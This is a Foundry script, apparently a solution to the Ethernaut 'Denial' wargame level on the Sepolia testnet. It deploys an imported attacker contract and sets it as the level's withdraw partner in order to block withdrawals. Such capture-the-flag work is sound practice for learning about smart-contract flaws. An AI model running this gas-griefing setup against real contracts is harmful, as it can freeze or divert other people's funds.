// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked20_Denial.sol";

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

//forge script  --rpc-url sepolia --account metamask  Cracked20_DenialScript --broadcast
contract Cracked20_DenialScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Denial_address"));
    }

    function run() public {
        vm.startBroadcast();
        Cracked20_Denial attack = new Cracked20_Denial();
        IDenial(ethernaut_contracts).setWithdrawPartner(address(attack));
        //IDenial(ethernaut_contracts).withdraw();
        vm.stopBroadcast();
    }
}
